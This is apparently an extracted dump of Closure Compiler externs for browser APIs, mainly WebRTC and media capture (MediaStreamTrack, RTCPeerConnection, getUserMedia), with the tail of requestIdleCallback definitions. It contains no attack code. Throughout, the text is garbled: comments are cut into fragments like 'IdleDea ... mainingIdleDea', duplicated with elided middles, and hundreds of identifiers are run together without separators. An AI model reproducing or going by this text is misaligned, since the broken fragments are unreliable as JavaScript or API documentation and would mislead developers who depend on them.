Called when the browser is idle.
function (!IdleDeadline)!IdleDeadlineIf set, gives the browser a time in ms by which
it must execute the callback. No timeout enforced otherwise.
(number|IdleCallbackOptions)=(number|IdleCallbackOptions)A handle that can be used to cancel the scheduled callback.Cancels a callback scheduled to run when the browser is idle.The handle returned by {@code requestIdleCallback} for
the scheduled callback to cancel.
An interface for an object passed into the callback for
{@code requestIdleCallback} that remains up-to-date on the amount of idle
time left in the current time slice.The amount of idle time (milliseconds) remaining in the
current time slice. Will always be positive or 0.Whether the callback was forced to run due to a timeout. Specifically,
whether the callback was invoked by the idle callback timeout algorithm:
https://w3c.github.io/requestidlecallback/#dfn-invoke-idle-callback-timeout-algorithmvar Idl ... ptions;IdleDea ... n() {};IdleDea ... on() {}IdleDea ... mainingIdleDea ... ototypeIdleDea ... imeout;IdleDea ... Timeout/mnt/disk1/t-namanjain/CodeQL/codeql/javascript/tools/data/externs/web/w3c_rtc.js
 * @fileoverview Definitions for components of the WebRTC browser API.
 * @see https://www.w3.org/TR/webrtc/
 * @see https://tools.ietf.org/html/draft-ietf-rtcweb-jsep-19
 * @see https://developer.mozilla.org/en-US/docs/Web/API/WebRTC_API
 * @see https://www.w3.org/TR/mediacapture-streams/
 *
 * @externs
 * @author bemasc@google.com (Benjamin M. Schwartz)
 /**\n *  ... tz)\n */
 * @typedef {string}
 * @see {https://www.w3.org/TR/mediacapture-streams/
 *     #idl-def-MediaStreamTrackState}
 * In WebIDL this is an enum with values 'live', 'mute', and 'ended',
 * but there is no mechanism in Closure for describing a specialization of
 * the string type.
 /**\n *  ... pe.\n */ @const {?string}  @const {boolean} /** @co ... ean} */
 * @interface
 * @see https://w3c.github.io/mediacapture-image/#mediasettingsrange-section
 
 * @interface
 * @see https://www.w3.org/TR/mediacapture-streams/#idl-def-MediaTrackCapabilities
 * @see https://w3c.github.io/mediacapture-image/#mediatrackcapabilities-section
  @type {!Array<string>}  @type {!Array<boolean>}  @type {!MediaSettingsRange} /** @ty ... nge} */
 * @interface
 * @see https://www.w3.org/TR/mediacapture-streams/#media-track-settings
 * @see https://w3c.github.io/mediacapture-image/#mediatracksettings-section
  @type {!Array<{x: number, y: number}>} /** @ty ... r}>} */
 * @interface
 * @see https://w3c.github.io/mediacapture-main/#media-track-supported-constraints
 
 * @interface
 * @extends {EventTarget}
 * @see https://www.w3.org/TR/mediacapture-streams/#mediastreamtrack
 
 * @param {!function(!Array<!SourceInfo>)} callback
 * @return {undefined}
 * @deprecated Use MediaDevices.enumerateDevices().
 /**\n *  ... ().\n */
 * @type {string}
 * @see https://crbug.com/653531
 * @see https://wicg.github.io/mst-content-hint/
 /**\n *  ... nt/\n */
 * @type {MediaStreamTrackState}
 * Read only.
 
 * Applies the specified set of constraints to the track, if any specified; or
 * if no constraints are specified, removes all constraints from the track.
 *
 * @param {MediaTrackConstraints=} constraints Constraints to apply to the
 *   track.
 * @return {!Promise<void>} A |Promise| that is resolved when the constraints
 *   have been applied, or rejected if there was an error applying the
 *   constraints.
 /**\n *  ... ts.\n */
 * @return {!MediaStreamTrack}
  @return {!MediaTrackCapabilities} /** @re ... ies} */ @return {!MediaTrackConstraints} /** @re ... nts} */ @return {!MediaTrackSettings} /** @re ... ngs} */
 * @typedef {{track: MediaStreamTrack}}
 /**\n *  ... k}}\n */
 * @param {string} type
 * @param {!MediaStreamTrackEventInit} eventInitDict
 * @constructor
 * @extends {Event}
 * @see https://www.w3.org/TR/mediacapture-streams/#mediastreamtrackevent
 
 * @type {!MediaStreamTrack}
 * @const
 
 * @param {!MediaStream|!Array<!MediaStreamTrack>=} streamOrTracks
 * @constructor
 * @implements {EventTarget}
 * @see https://www.w3.org/TR/mediacapture-streams/#mediastream
 /**\n *  ... eam\n */
 * @override
 /**\n * @override\n */
 * TODO(bemasc): Remove this property.
 * @deprecated
 * @type {string}
 * @const
 
 * @return {!Array<!MediaStreamTrack>}
 
 * @param {string} trackId
 * @return {MediaStreamTrack}
 
 * @param {!MediaStreamTrack} track
 * @return {undefined}
 
 * @return {!MediaStream}
 
 * @deprecated
 * @type {boolean}
 
 * @deprecated
 * @type {?function(!Event)}
 
 * @type {?function(!MediaStreamTrackEvent)}
 
 * @deprecated
 * TODO(bemasc): Remove this method once browsers have updated to
 * MediaStreamTrack.stop().
 * @return {undefined}
 
 * @type {function(new: MediaStream,
 *                 (!MediaStream|!Array<!MediaStreamTrack>)=)}
 
 * @typedef {{tone: string}}
 * @see https://www.w3.org/TR/webrtc/#dom-rtcdtmftonechangeeventinit
 
 * @param {string} type
 * @param {!RTCDTMFToneChangeEventInit} eventInitDict
 * @constructor
 * @extends {Event}
 * @see https://www.w3.org/TR/webrtc/#dom-rtcdtmftonechangeevent
 
 * @interface
 * @see https://www.w3.org/TR/webrtc/#rtcdtmfsender
 
 * @param {string} tones
 * @param {number=} opt_duration
 * @param {number=} opt_interToneGap
 /**\n *  ... Gap\n */
 * @type {?function(!RTCDTMFToneChangeEvent)}
 
 * @interface
 * @see https://www.w3.org/TR/webrtc/#rtcrtpsender-interface
 
 * @const {!RTCDTMFSender}
 
 * @const {!MediaStreamTrack}
 
 * @param {!MediaStreamTrack} track
 
 * @return {!Object}
 
 * @param {!Object} params
 * @return {!Promise<undefined>}
 
 * @interface
 * @see https://www.w3.org/TR/webrtc/#dom-rtcrtpcontributingsource
 
 * @type {?number}
 
 * @type {?Date}
 
 * @interface
 * @see https://www.w3.org/TR/webrtc/#rtcrtpreceiver-interface
 
 * @return {!Array<!RTCRtpContributingSource>}
 
 * @see https://www.w3.org/TR/webrtc/#dom-rtcrtptransceiverinit
 * @record
 
 * The direction of the `RTCRtpTransceiver`. Defaults to "sendrecv".
 * @type {?RTCRtpTransceiverDirection|undefined}
 
 * The streams to add to the tranceiver's sender.
 * @type {?Array<!MediaStream>|undefined}
 
 * @type {?Array<!RTCRtpEncodingParameters>|undefined}
 
 * @see https://www.w3.org/TR/webrtc/#dom-rtcrtpencodingparameters
 * @record
 
 * @type {?number|undefined}
 
 * Possible values are "disabled" and "enabled".
 * @type {?string|undefined}
 
 * @type {?boolean|undefined}
 
 * Possible values are "very-low", "low" (default), "medium", and "high".
 * @type {?string|undefined}
 
 * @type {?string|number}
 
 * @type {?number|number}
 
 * @interface
 * @see https://www.w3.org/TR/webrtc/#rtcrtptransceiver-interface
 
 * @const {?string}
 
 * @const {!RTCRtpTransceiverDirection}
 
 * @const {?RTCRtpTransceiverDirection}
 
 * @param {!RTCRtpTransceiverDirection} direction
 
 * @const {?RTCRtpSender}
 
 * @const {?RTCRtpReceiver}
 
 * @see https://w3c.github.io/mediacapture-main/getusermedia.html#dom-longrange
 * @record
 
 * @type {number|undefined}
 
 * @see https://w3c.github.io/mediacapture-main/getusermedia.html#dom-doublerange
 * @record
 
 * @see https://w3c.github.io/mediacapture-main/getusermedia.html#dom-constrainbooleanparameters
 * @record
 
 * @type {boolean|undefined}
 
 * @see https://w3c.github.io/mediacapture-main/getusermedia.html#dom-constraindomstringparameters
 * @record
 
 * @type {string|Array<string>|undefined}
 
 * @see https://w3c.github.io/mediacapture-main/getusermedia.html#dom-constraindoublerange
 * @record
 * @extends {DoubleRange}
 
 * @see https://w3c.github.io/mediacapture-main/getusermedia.html#dom-constrainlongrange
 * @record
 * @extends {LongRange}
 
 * @see https://w3c.github.io/mediacapture-main/getusermedia.html#dom-constrainboolean
 * @typedef {boolean|ConstrainBooleanParameters}
 /**\n *  ... rs}\n */
 * @see https://w3c.github.io/mediacapture-main/getusermedia.html#dom-constraindomString
 * @typedef {string|Array<string>|ConstrainDOMStringParameters}
 
 * @see https://w3c.github.io/mediacapture-main/getusermedia.html#dom-constraindouble
 * @typedef {number|ConstrainDoubleRange}
 
 * @see https://w3c.github.io/mediacapture-main/getusermedia.html#dom-constrainlong
 * @typedef {number|ConstrainLongRange}
 
 * @see https://w3c.github.io/mediacapture-main/getusermedia.html#dom-mediatrackconstraintset
 * @record
 * @private
 
 * @type {ConstrainBoolean|undefined}
 
 * @type {ConstrainDouble|undefined}
 
 * @type {ConstrainLong|undefined}
 
 * @type {ConstrainDOMString|undefined}
 
 * @record
 * @extends {MediaTrackConstraintSet}
 
 * @type {Array<!MediaTrackConstraintSet>|undefined}
 
 * @see https://w3c.github.io/mediacapture-main/getusermedia.html#media-track-constraints
 * @record
 
 * @type {boolean|MediaTrackConstraints|undefined}
 
 * @see {http://dev.w3.org/2011/webrtc/editor/getusermedia.html#
 *     navigatorusermediaerror-and-navigatorusermediaerrorcallback}
 * @interface
 
 * @type {number}
 * @deprecated Removed from the standard and some browsers.
 * @const
  1 /** 1 */
 * @type {number}
 * @deprecated Removed from the standard and some browsers.
 * Read only.
 
 * @type {string}
 * Read only.
 
 * @type {?string}
 * Read only.
 
 * @param {MediaStreamConstraints} constraints A MediaStreamConstraints object.
 * @param {function(!MediaStream)} successCallback
 *     A NavigatorUserMediaSuccessCallback function.
 * @param {function(!NavigatorUserMediaError)=} errorCallback A
 *     NavigatorUserMediaErrorCallback function.
 * @see http://dev.w3.org/2011/webrtc/editor/getusermedia.html
 * @see https://www.w3.org/TR/mediacapture-streams/
 * @return {undefined}
 
 * @param {string} type
 * @param {!Object} eventInitDict
 * @constructor
 
 * @type {?MediaStream}
 * @const
 
 * @record
 * @see https://www.w3.org/TR/mediastream-recording/#dictdef-mediarecorderoptions
  @type {(string|undefined)}  @type {(number|undefined)} 
 * @see https://www.w3.org/TR/mediastream-recording/#mediarecorder-api
 * @param {!MediaStream} stream
 * @param {MediaRecorderOptions=} options
 * @implements {EventTarget}
 * @constructor
 
 * @type {!MediaStream}
 
 * @type {(function(!Event)|undefined)}
 
 * @param {number=} timeslice
 
 * @interface
 * @see https://w3c.github.io/mediacapture-image/##photosettings-section
 
 * @interface
 * @see https://w3c.github.io/mediacapture-image/##photocapabilities-section
 
 * @type {!MediaSettingsRange}
 * @const
 
 * @type {!Array<!string>}
 * @const
 
 * @see https://w3c.github.io/mediacapture-image/
 * @param {!MediaStreamTrack} videoTrack
 * @constructor
 
 * @param {!PhotoSettings=} photoSettings
 * @return {!Promise<!Blob>}
 /**\n *  ... b>}\n */
 * @return {!Promise<!PhotoCapabilities>}
 
 * @return {!Promise<!ImageBitmap>}
 /**\n *  ... p>}\n */
 * @see https://www.w3.org/TR/webrtc/#rtctrackevent
 * @param {string} type
 * @param {!Object} eventInitDict
 * @constructor
 
 * @type {?RTCRtpReceiver}
 * @const
 
 * @type {?MediaStreamTrack}
 * @const
 
 * @type {?Array<!MediaStream>}
 * @const
 
 * @type {?RTCRtpTransceiver}
 * @const
 
 * @typedef {string}
 * @see https://www.w3.org/TR/mediacapture-streams/#idl-def-MediaDeviceKind
 * In WebIDL this is an enum with values 'audioinput', 'audiooutput', and
 * 'videoinput', but there is no mechanism in Closure for describing a
 * specialization of the string type.
 
 * Possible values are "sendrecv", "sendonly", "recvonly", and "inactive".
 * @typedef {string}
 * @see https://www.w3.org/TR/webrtc/#dom-rtcrtptransceiverdirection
  @const {!MediaDeviceKind} /** @co ... ind} */
 * @interface
 * @extends {EventTarget}
 * @see https://www.w3.org/TR/mediacapture-streams/#mediadevices
 /**\n *  ... ces\n */
 * @return {!Promise<!Array<!MediaDeviceInfo>>}
 
 * @see https://developer.mozilla.org/en-US/docs/Web/API/MediaDevices/getUserMedia
 * @param {!MediaStreamConstraints} constraints
 * @return {!Promise<!MediaStream>}
 
 * @see https://w3c.github.io/mediacapture-main/#dom-mediadevices-getsupportedconstraints
 * @return {!MediaTrackSupportedConstraints}
  @const {!MediaDevices} /** @co ... ces} */
 * @typedef {string}
 * @see https://www.w3.org/TR/webrtc/#rtcsdptype
 * In WebIDL this is an enum with values 'offer', 'pranswer', and 'answer',
 * but there is no mechanism in Closure for describing a specialization of
 * the string type.
 
 * @param {!Object=} descriptionInitDict The RTCSessionDescriptionInit
 * dictionary.  This optional argument may have type
 * {type:RTCSdpType, sdp:string}, but neither of these keys are required to be
 * present, and other keys are ignored, so the closest Closure type is Object.
 * @constructor
 * @see https://www.w3.org/TR/webrtc/#rtcsessiondescription-class
 
 * @type {?RTCSdpType}
 * @see https://www.w3.org/TR/webrtc/#dom-rtcsessiondescription-type
 
 * @type {?string}
 * @see https://www.w3.org/TR/webrtc/#dom-rtcsessiondescription-sdp
 /**\n *  ... sdp\n */
 * TODO(bemasc): Remove this definition once it is removed from the browser.
 * @param {string} label The label index (audio/video/data -> 0,1,2)
 * @param {string} sdp The ICE candidate in SDP text form
 * @constructor
 
 * @type {?string}
  @record /** @record */ @type {?string|undefined} 
 * @param {!RTCIceCandidateInit=} candidateInitDict  The RTCIceCandidateInit dictionary.
 * @constructor
 * @see https://www.w3.org/TR/webrtc/#rtcicecandidate-interface
 
 * @typedef {{urls: string}|{urls: !Array<!string>}}
 * @private
 * @see https://www.w3.org/TR/webrtc/#rtciceserver-dictionary
 * This dictionary type also has an optional key {credential: ?string}.
 /**\n *  ... g}.\n */
 * @interface
 * @private
 
 * @type {string|!Array<!string>}
 
 * This type, and several below it, are constructed as unions between records
 *
 * @typedef {RTCIceServerRecord_|RTCIceServerInterface_}
 * @private
 
 * @typedef {{
 *   iceServers: !Array<!RTCIceServer>,
 *   sdpSemantics: (string|undefined)
 * }}
 * @private
 
 * @type {!Array<!RTCIceServer>}
 
 * Allows specifying the SDP semantics. Valid values are "plan-b" and
 * "unified-plan".
 *
 * @see {@link https://webrtc.org/web-apis/chrome/unified-plan/}
 * @type {string|undefined}
 
 * @typedef {RTCConfigurationRecord_|RTCConfigurationInterface_}
 /**\n *  ... e_}\n */
 * @typedef {function(!RTCSessionDescription)}
 
 * @typedef {function(string)}
 
 * @typedef {function()}
 
 * @typedef {string}
 
 * @type {RTCIceCandidate}
 * @const
  Note: The specification of RTCStats types is still under development.// Note ... opment. Declarations here will be updated and removed to follow the development of// Decl ... ment of modern browsers, breaking compatibility with older versions as they become// mode ...  become obsolete.// obsolete.
 * @type {Date}
 * @const
 
 * @return {!Array<!string>}
 
 * @deprecated
 * @type {RTCStatsReport}
 * @const
  Note: Below are Map like methods supported by WebRTC statistics// Note ... tistics specification-compliant RTCStatsReport. Currently only implemented by// spec ... nted by Mozilla.// Mozilla. See https://www.w3.org/TR/webrtc/#rtcstatsreport-object for definition.// See  ... nition.
 * @param {function(this:SCOPE, Object, string, MAP)} callback
 * @param {SCOPE=} opt_thisObj The value of "this" inside callback function.
 * @this {MAP}
 * @template MAP,SCOPE
 * @readonly
 /**\n *  ... nly\n */
 * @param {string} key
 * @return {Object}
 * @readonly
 
 * @return {!IteratorIterable<string>}
 * @readonly
 
 * TODO(bemasc): Remove this type once it is no longer in use.  It has already
 * been removed from the specification.
 * @typedef {RTCStatsReport}
 * @deprecated
 
 * @return {!Array<!RTCStatsReport>}
 
 * @typedef {function(!RTCStatsResponse, MediaStreamTrack=)}
 
 * This type is not yet standardized, so the properties here only represent
 * the current capabilities of libjingle (and hence Chromium).
 * TODO(bemasc): Add a link to the relevant standard once MediaConstraint has a
 * standard definition.
 *
 * @interface
 * @private
 
 * @type {?boolean}
 
 * TODO(bemasc): Make this type public once it is defined in a standard.
 *
 * @typedef {Object|MediaConstraintSetInterface_}
 * @private
 
 * @type {?MediaConstraintSet_}
 /**\n *  ... t_}\n */
 * @type {?Array<!MediaConstraintSet_>}
 /**\n *  ... _>}\n */
 * This type is used extensively in
 * {@see http://dev.w3.org/2011/webrtc/editor/webrtc.html} but is not yet
 * defined.
 *
 * @typedef {Object|MediaConstraintsInterface_}
 
 * An enumerated string type (RTCDataChannelState) with values:
 * "connecting", "open", "closing", and "closed".
 * @type {string}
 * Read only.
 
 * @type {number}
 * Read only.
 
 * @type {?function(!MessageEvent<*>)}
 
 * @param {string|!Blob|!ArrayBuffer|!ArrayBufferView} data
 * @return {undefined}
 
 * @constructor
 * @extends {Event}
 * @private
 
 * @type {!RTCDataChannel}
 * Read only.
 
 * @typedef {{reliable: boolean}}
 
 * @typedef {Object}
 * @property {boolean=} [ordered=true]
 * @property {number=} maxPacketLifeTime
 * @property {number=} maxRetransmits
 * @property {string=} [protocol=""]
 * @property {boolean=} [negotiated=false]
 * @property {number=} id
 * @property {string=} [priority='low']
 * see https://www.w3.org/TR/webrtc/#dom-rtcdatachannelinit for documentation
 * Type inconsistencies due to Closure limitations:
 * maxPacketLifeTime should be UnsignedShort
 * maxRetransmits should be UnsignedShort
 * protocol should be USVString
 * id should be UnsignedShort
 * In WebIDL priority is an enum with values 'very-low', 'low',
 * 'medium' and 'high', but there is no mechanism in Closure for describing
 * a specialization of the string type.
 
 * @typedef {RTCDataChannelInitInterface_|RTCDataChannelInitRecord_|RTCDataChannelInitDictionary_}
 /**\n *  ... y_}\n */
 * @typedef {{expires: number}}
 
 * @param {RTCConfiguration} configuration
 * @param {!MediaConstraints=} constraints
 * @constructor
 * @implements {EventTarget}
 
 * @param {Object} keygenAlgorithm
 * @return {Promise<RTCCertificate>}
  NB: Until closure annotations support overloading, many of the following// NB:  ... llowing functions take odd unions of parameter types.  This is to support the various// func ... various api differences between browsers.  Generally, returning a promise means you// api  ... ans you don't take callback function parameters and draw any further parameters// don' ... ameters forward, and vice versa.// forw ...  versa.
 * @param {(!RTCSessionDescriptionCallback|!MediaConstraints)=}
 *    successCallbackOrConstraints
 * @param {!RTCPeerConnectionErrorCallback=} errorCallback
 * @param {!MediaConstraints=} constraints
 * @return {!Promise<!RTCSessionDescription>|undefined}
 
 * @param {!RTCSessionDescription} description
 * @param {!RTCVoidCallback=} successCallback
 * @param {!RTCPeerConnectionErrorCallback=} errorCallback
 * @return {!Promise<!RTCSessionDescription>}
 
 * @type {?RTCSessionDescription}
 * Read only.
 
 * @type {RTCSignalingState}
 * Read only.
 
 * @param {?RTCConfiguration=} configuration
 * @param {?MediaConstraints=} constraints
 * @return {undefined}
 
 * Void in Chrome for now, a promise that you can then/catch in Firefox.
 * @param {!RTCIceCandidate} candidate
 * @param {!RTCVoidCallback=} successCallback
 * @param {!function(DOMException)=} errorCallback
 * @return {!Promise|undefined}
 
 * @type {!RTCIceGatheringState}
 * Read only.
 
 * @type {!RTCIceConnectionState}
 * Read only.
 
 * @return {!Array<!MediaStream>}
 
 * @param {string} streamId
 * @return {MediaStream}
 
 * @return {!Array<!RTCRtpSender>}
 
 * @return {!Array<!RTCRtpReceiver>}
 
 * @param {?string} label
 * @param {RTCDataChannelInit=} dataChannelDict
 * @return {!RTCDataChannel}
 /**\n *  ... el}\n */
 * @param {!MediaStream} stream
 * @param {!MediaConstraints=} constraints
 * @return {undefined}
 
 * @param {!MediaStream} stream
 * @return {undefined}
 
 * @param {!MediaStreamTrack} track
 * @param {!MediaStream} stream
 * @param {...MediaStream} var_args Additional streams.
 * @return {!RTCRtpSender}
 
 * @param {!MediaStreamTrack|string} trackOrKind
 * @param {?RTCRtpTransceiverInit=} init
 * @return {!RTCRtpTransceiver}
 
 * Returns the list of transceivers are currently attached to this peer.
 *
 * @return {!Array<!RTCRtpTransceiver>}
 
 * @return {!RTCConfiguration}
 
 * @param {!RTCConfiguration} configuration
 * @return {undefined}
 
 * @param {!RTCRtpSender} sender
 * @return {undefined}
  TODO(bemasc): Add identity provider stuff once implementations exist// TODO ... s exist TODO(rjogrady): Per w3c spec, getStats() should always return a Promise.// TODO ... romise. Remove RTCStatsReport from the return value once Firefox supports that.// Remo ... s that.
 * Firefox' getstats is synchronous and returns a much simpler
 * {!RTCStatsReport} Map-like object.
 * @param {!RTCStatsCallback=} successCallback
 * @param {MediaStreamTrack=} selector
 * @return {undefined|!RTCStatsReport|!Promise<!RTCStatsReport>}
 
 * @type {?function(!RTCPeerConnectionIceEvent)}
 
 * @type {?function(!MediaStreamEvent)}
 
 * @type {?function(!RTCTrackEvent)}
 
 * @type {?function(!RTCDataChannelEvent)}
 
 * @interface
 * @param {RTCIceGatherer} iceGatherer
 * @see https://www.w3.org/TR/webrtc/#idl-def-rtcicetransport
 
 * @type {!RTCIceGatheringState}
 * @const
 
 * @return {RTCIceCandidate[]}
 /**\n *  ... []}\n */
 * @return {RTCIceCandidatePair}
 
 * @return {RTCIceParameters}
 
 * @param {!Event} e
 * @return {undefined}
 
 * @constructor
 * @param {!RTCIceGatherOptions} options
 * @see https://msdn.microsoft.com/en-us/library/mt433107(v=vs.85).aspx
 
 * @interface
 * @param {RTCIceTransport} iceTransport
 * @see https://www.w3.org/TR/webrtc/#idl-def-rtcdtlstransport
 
 * @type {RTCIceTransport}
 * @const
 
 * @return {ArrayBuffer[]}
 MediaStreamTrackStateSourceInfofacingMediaSettingsRangeMediaTrackCapabilitiesaspectRatioframeRatefacingModesampleRatesampleSizeechoCancellationlatencychannelCountdeviceIdgroupIdwhiteBalanceModeexposureModefocusModeexposureCompensationcolorTemperatureisobrightnesscontrastsaturationsharpnesstorchMediaTrackSettingspointsOfInterestMediaTrackSupportedConstraintsautoGainControlnoiseSuppressionMediaStreamTrackgetSourcesenabledcontentHintremoteonmuteonunmuteonoverconstrainedapplyConstraintsconstraintsgetCapabilitiesgetConstraintsgetSettingsMediaStreamTrackEventInitMediaStreamTrackEventeventInitDictstreamOrTracksgetAudioTracksgetVideoTracksgetTrackstrackIdaddTrackremoveTrackonactiveoninactiveonaddtrackonremovetrackwebkitMediaStreamRTCDTMFToneChangeEventInitRTCDTMFToneChangeEventtoneRTCDTMFSenderinsertDTMFtonesopt_durationopt_interToneGapontonechangetoneBufferRTCRtpSendertransportdtmfreplaceTrackgetParameterssetParametersRTCRtpContributingSourceRTCRtpReceivergetContributingSourcesgetSynchronizationSourcesRTCRtpTransceiverInitstreamssendEncodingsRTCRtpEncodingParameterscodecPayloadTypedtxptimemaxBitratemaxFramerateridscaleResolutionDownByRTCRtpTransceivermidstoppedcurrentDirectionsetDirectionreceiverLongRangeDoubleRangeConstrainBooleanParametersexactidealConstrainDOMStringParametersConstrainDoubleRangeConstrainLongRangeConstrainBooleanConstrainDOMStringConstrainDoubleConstrainLongMediaTrackConstraintSetMediaTrackConstraintsadvancedMediaStreamConstraintsaudiovideoNavigatorUserMediaErrorconstraintNamewebkitGetUserMediaMediaStreamEventMediaRecorderOptionsaudioBitsPerSecondvideoBitsPerSecondbitsPerSecondMediaRecorderonstartonstoponresumetimeslicerequestDataPhotoSettingsfillLightModeimageHeightimageWidthredEyeReductionPhotoCapabilitiesImageCapturevideoTracktakePhotophotoSettingsgetPhotoCapabilitiesgrabFrameRTCTrackEventtransceiverMediaDeviceKindRTCRtpTransceiverDirectionMediaDeviceInfoMediaDevicesenumerateDevicesgetUserMediagetSupportedConstraintsmediaDevicesRTCSdpTypeRTCSessionDescriptiondescriptionInitDictsdpIceCandidatetoSdpRTCIceCandidateInitcandidatesdpMidsdpMLineIndexusernameFragmentRTCIceCandidatecandidateInitDictRTCIceServerRecord_RTCIceServerInterface_urlscredentialRTCIceServerRTCConfigurationRecord_RTCConfigurationInterface_iceServerssdpSemanticsRTCConfigurationRTCSessionDescriptionCallbackRTCPeerConnectionErrorCallbackRTCVoidCallbackRTCSignalingStateRTCIceConnectionStateRTCIceGatheringStateRTCPeerConnectionIceEventRTCStatsReportlocalopt_thisObjRTCStatsElementRTCStatsResponseRTCStatsCallbackMediaConstraintSetInterface_OfferToReceiveAudioOfferToReceiveVideoDtlsSrtpKeyAgreementRtpDataChannelsMediaConstraintSet_MediaConstraintsInterface_mandatoryoptionalMediaConstraintsRTCDataChannelreliableRTCDataChannelEventchannelRTCDataChannelInitRecord_RTCDataChannelInitInterface_RTCDataChannelInitDictionary_RTCDataChannelInitRTCCertificateRTCPeerConnectionconfigurationgenerateCertificatekeygenAlgorithmcreateOffersuccessCallbackOrConstraintscreateAnswersetLocalDescriptionsetRemoteDescriptionlocalDescriptionremoteDescriptionsignalingStateupdateIceaddIceCandidateiceGatheringStateiceConnectionStategetLocalStreamsgetRemoteStreamsgetStreamByIdstreamIdgetSendersgetReceiverscreateDataChanneldataChannelDictaddStreamremoveStreamaddTransceivertrackOrKindgetTransceiversgetConfigurationsetConfigurationgetStatsonnegotiationneededonicecandidateonsignalingstatechangeonaddstreamontrackonremovestreamoniceconnectionstatechangeondatachannelwebkitRTCPeerConnectionmozRTCPeerConnectionRTCIceTransporticeGatherergatheringStategetLocalCandidatesgetRemoteCandidatesgetSelectedCandidatePairgetLocalParametersgetRemoteParametersonstatechangeongatheringstatechangeonselectedcandidatepairchangeRTCIceGathererRTCDtlsTransporticeTransportgetRemoteCertificatesDefinitions for components of the WebRTC browser API.
https://www.w3.org/TR/webrtc/
https://tools.ietf.org/html/draft-ietf-rtcweb-jsep-19
https://developer.mozilla.org/en-US/docs/Web/API/WebRTC_API
https://www.w3.org/TR/mediacapture-streams/
*bemasc@google.com (Benjamin M. Schwartz){https://www.w3.org/TR/mediacapture-streams/
#idl-def-MediaStreamTrackState}
In WebIDL this is an enum with values 'live', 'mute', and 'ended',
but there is no mechanism in Closure for describing a specialization of
the string type.https://w3c.github.io/mediacapture-image/#mediasettingsrange-sectionhttps://www.w3.org/TR/mediacapture-streams/#idl-def-MediaTrackCapabilities
https://w3c.github.io/mediacapture-image/#mediatrackcapabilities-section!Array.<boolean>Array.<boolean>!MediaSettingsRangehttps://www.w3.org/TR/mediacapture-streams/#media-track-settings
https://w3c.github.io/mediacapture-image/#mediatracksettings-section!Array.<{x: number, y: number}>Array.<{x: number, y: number}>{x: number, y: number}https://w3c.github.io/mediacapture-main/#media-track-supported-constraintshttps://www.w3.org/TR/mediacapture-streams/#mediastreamtrack!function (!Array.<!SourceInfo>)function (!Array.<!SourceInfo>)!Array.<!SourceInfo>Array.<!SourceInfo>!SourceInfoUse MediaDevices.enumerateDevices().https://crbug.com/653531
https://wicg.github.io/mst-content-hint/Read only.Applies the specified set of constraints to the track, if any specified; or
if no constraints are specified, removes all constraints from the track.Constraints to apply to the
track.
MediaTrackConstraints=A |Promise| that is resolved when the constraints
have been applied, or rejected if there was an error applying the
constraints.!MediaStreamTrack!MediaTrackCapabilities!MediaTrackConstraints!MediaTrackSettings{track: MediaStreamTrack}!MediaStreamTrackEventInithttps://www.w3.org/TR/mediacapture-streams/#mediastreamtrackevent(!MediaStream|!Array.<!MediaStreamTrack>)=(!MediaStream|!Array.<!MediaStreamTrack>)!Array.<!MediaStreamTrack>Array.<!MediaStreamTrack>https://www.w3.org/TR/mediacapture-streams/#mediastreamTODO(bemasc): Remove this property.?function (!MediaStreamTrackEvent)function (!MediaStreamTrackEvent)!MediaStreamTrackEventTODO(bemasc): Remove this method once browsers have updated to
MediaStreamTrack.stop().
function (new: MediaStream, (!MediaStream|!Array.<!MediaStreamTrack>)=){tone: string}https://www.w3.org/TR/webrtc/#dom-rtcdtmftonechangeeventinit!RTCDTMFToneChangeEventInithttps://www.w3.org/TR/webrtc/#dom-rtcdtmftonechangeeventhttps://www.w3.org/TR/webrtc/#rtcdtmfsender?function (!RTCDTMFToneChangeEvent)function (!RTCDTMFToneChangeEvent)!RTCDTMFToneChangeEventhttps://www.w3.org/TR/webrtc/#rtcrtpsender-interface!RTCDTMFSenderhttps://www.w3.org/TR/webrtc/#dom-rtcrtpcontributingsource?Datehttps://www.w3.org/TR/webrtc/#rtcrtpreceiver-interface!Array.<!RTCRtpContributingSource>Array.<!RTCRtpContributingSource>!RTCRtpContributingSourcehttps://www.w3.org/TR/webrtc/#dom-rtcrtptransceiverinit
The direction of the `RTCRtpTransceiver`. Defaults to "sendrecv".(?RTCRtpTransceiverDirection|undefined)?RTCRtpTransceiverDirectionThe streams to add to the tranceiver's sender.(?Array.<!MediaStream>|undefined)?Array.<!MediaStream>Array.<!MediaStream>(?Array.<!RTCRtpEncodingParameters>|undefined)?Array.<!RTCRtpEncodingParameters>Array.<!RTCRtpEncodingParameters>!RTCRtpEncodingParametershttps://www.w3.org/TR/webrtc/#dom-rtcrtpencodingparameters
Possible values are "disabled" and "enabled".Possible values are "very-low", "low" (default), "medium", and "high".(?string|number)(?number|number)https://www.w3.org/TR/webrtc/#rtcrtptransceiver-interface!RTCRtpTransceiverDirection?RTCRtpSender?RTCRtpReceiverhttps://w3c.github.io/mediacapture-main/getusermedia.html#dom-longrange
https://w3c.github.io/mediacapture-main/getusermedia.html#dom-doublerange
https://w3c.github.io/mediacapture-main/getusermedia.html#dom-constrainbooleanparameters
https://w3c.github.io/mediacapture-main/getusermedia.html#dom-constraindomstringparameters
(string|Array.<string>|undefined)https://w3c.github.io/mediacapture-main/getusermedia.html#dom-constraindoublerange
https://w3c.github.io/mediacapture-main/getusermedia.html#dom-constrainlongrange
https://w3c.github.io/mediacapture-main/getusermedia.html#dom-constrainboolean
(boolean|ConstrainBooleanParameters)https://w3c.github.io/mediacapture-main/getusermedia.html#dom-constraindomString
(string|Array.<string>|ConstrainDOMStringParameters)https://w3c.github.io/mediacapture-main/getusermedia.html#dom-constraindouble
(number|ConstrainDoubleRange)https://w3c.github.io/mediacapture-main/getusermedia.html#dom-constrainlong
(number|ConstrainLongRange)https://w3c.github.io/mediacapture-main/getusermedia.html#dom-mediatrackconstraintset
(ConstrainBoolean|undefined)(ConstrainDouble|undefined)(ConstrainLong|undefined)(ConstrainDOMString|undefined)(Array.<!MediaTrackConstraintSet>|undefined)Array.<!MediaTrackConstraintSet>!MediaTrackConstraintSethttps://w3c.github.io/mediacapture-main/getusermedia.html#media-track-constraints
(boolean|MediaTrackConstraints|undefined){http://dev.w3.org/2011/webrtc/editor/getusermedia.html#
navigatorusermediaerror-and-navigatorusermediaerrorcallback}
Removed from the standard and some browsers.
Removed from the standard and some browsers.
Read only.A MediaStreamConstraints object.
A NavigatorUserMediaSuccessCallback function.
function (!MediaStream)A
NavigatorUserMediaErrorCallback function.
